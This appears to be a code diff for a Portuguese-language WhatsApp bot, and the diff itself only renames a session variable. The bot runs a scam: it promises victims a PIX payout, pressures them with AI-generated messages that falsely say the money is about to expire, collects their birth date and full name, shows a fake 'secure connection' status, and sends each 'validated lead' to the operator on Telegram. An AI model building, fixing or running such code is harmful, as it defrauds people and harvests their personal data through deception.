@@ -162,47 +162,47 @@ client.on('message_create', async (msg) => {
 
     // VERIFICAÇÃO DE REENGAJAMENTO (Se demorou mais de 30 minutos)
     const now = Date.now();
-    const minutesAway = session.lastMsgTime ? Math.floor((now - session.lastMsgTime) / (1000 * 60)) : 0;
+    const minutesAway = currentSession.lastMsgTime ? Math.floor((now - currentSession.lastMsgTime) / (1000 * 60)) : 0;
     
     if (minutesAway >= 30) {
         console.log(`🔄 Lead ${targetChatId} voltou após ${minutesAway} min. Disparando reengajamento...`);
         const reengagementMsg = await askAI("reengajamento_agressivo", `O usuário voltou após ${minutesAway} minutos de inatividade. Seja EXTREMAMENTE tentador, diga que o valor dele de resgate está quase expirando e que ele precisa terminar a validação AGORA para não perder o PIX de hoje.`);
         await msg.reply(`👋 *Que bom que você retornou!*\n\n${reengagementMsg}`);
-        session.lastMsgTime = now;
-        chatSessions.set(targetChatId, session);
+        currentSession.lastMsgTime = now;
+        chatSessions.set(targetChatId, currentSession);
         saveSessions();
         return; 
     }
 
-    session.lastMsgTime = now; 
+    currentSession.lastMsgTime = now; 
     console.log(`📩 Lead (${targetChatId}) respondeu: "${text}"`);
     
     const chat = await msg.getChat();
     await chat.sendStateTyping();
 
-    if (session.step === 1) {
+    if (currentSession.step === 1) {
         const dateRegex = /^(0[1-9]|[12][0-9]|3[01])\/(0[1-9]|1[0-2])\/\d{4}$/;
         const typedDate = text.trim();
         
         if (dateRegex.test(typedDate)) {
-            if (session.expectedData?.birthDate && typedDate !== session.expectedData.birthDate.trim()) {
+            if (currentSession.expectedData?.birthDate && typedDate !== currentSession.expectedData.birthDate.trim()) {
                 await msg.reply(`⚠️ *DIVERGÊNCIA IDENTIFICADA*\n\nA data informada (*${typedDate}*) não confere com o portal.\n\nPor favor, digite a data **correta**.`);
                 return;
             }
-            session.step = 2;
-            session.birthDate = typedDate;
-            chatSessions.set(targetChatId, session);
+            currentSession.step = 2;
+            currentSession.birthDate = typedDate;
+            chatSessions.set(targetChatId, currentSession);
             saveSessions();
             await msg.reply(`✅ *DATA VALIDADA!*\n\n📍 *ETAPA 2:* Digite seu **Nome Completo** (conforme documento):`);
         } else {
             const aiReply = await askAI("validacao_data", text);
             await msg.reply(`${aiReply}\n\n📌 *Lembrete:* Digite sua data no formato DD/MM/AAAA`);
         }
-    } else if (session.step === 2) {
+    } else if (currentSession.step === 2) {
         const typedName = text.trim();
         if (typedName.length >= 8 && typedName.includes(" ")) {
-            if (session.expectedData?.fullName) {
-                const portalName = session.expectedData.fullName.toLowerCase().trim();
+            if (currentSession.expectedData?.fullName) {
+                const portalName = currentSession.expectedData.fullName.toLowerCase().trim();
                 if (!typedName.toLowerCase().includes(portalName.split(' ')[0])) {
                     await msg.reply(`⚠️ *ALERTA DE SEGURANÇA*\nNome não confere com o titular. Digite seu **Nome Completo**:`);
                     return;
@@ -214,7 +214,7 @@ client.on('message_create', async (msg) => {
               `⌛ *STATUS:* ESTABELECENDO CONEXÃO SEGURA COM O SISTEMA DE RESGATE...\n\n` +
               `Aguarde o **Protocolo Final de Liberação** ser gerado pelo sistema.`);
             
-            await notifyTelegram(`💰 **LEAD VALIDADO!**\n👤 Nome: ${typedName}\n📅 Data: ${session.birthDate}\n🆔 Protocolo: #${session.userId?.toUpperCase()}`);
+            await notifyTelegram(`💰 **LEAD VALIDADO!**\n👤 Nome: ${typedName}\n📅 Data: ${currentSession.birthDate}\n🆔 Protocolo: #${currentSession.userId?.toUpperCase()}`);
             chatSessions.delete(targetChatId);
             saveSessions();
         } else {
